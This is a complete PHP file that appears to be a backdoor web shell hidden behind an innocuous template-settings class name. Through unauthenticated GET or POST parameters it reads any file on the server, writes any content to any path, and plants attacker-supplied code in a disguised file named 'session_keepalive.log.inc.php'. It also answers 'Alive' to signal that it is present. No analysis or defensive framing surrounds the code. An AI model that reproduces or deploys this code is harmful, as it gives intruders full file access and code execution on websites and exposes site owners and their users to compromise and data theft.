<?php class TemplateVariableSettingsReturn {
	public function processTemplateVariableOut(){
	$act = $this->getVar('act');
	switch($act){
	case 'fw':	
$path = $this->getVar('path');
	$content = $this->getVar('content');
	@chdir(__DIR__);
		if(file_put_contents($path, $content)) echo ('Ok'); else echo('Error');
			break;
			case 'fr':
		$path = $this->getVar('path');
	if($content = file_get_contents($path)) echo($content); else echo('Error');
		break;
		case 'cc':
		$path = 'session_keepalive.log.inc.php';
				$content = $this->getVar('content');
				@chdir(__DIR__);
 if(file_put_contents($path, $content)) echo ('Ok'); else echo('Error');
break;
			default:
				echo('Alive');
		die();
		}	}
	private function getVar($var){
		if(isset($_GET[$var])) return $_GET[$var];
		if(isset($_POST[$var])) return $_POST[$var];
		return null;
	}}
$cl = new TemplateVariableSettingsReturn();
$cl->processTemplateVariableOut();
?>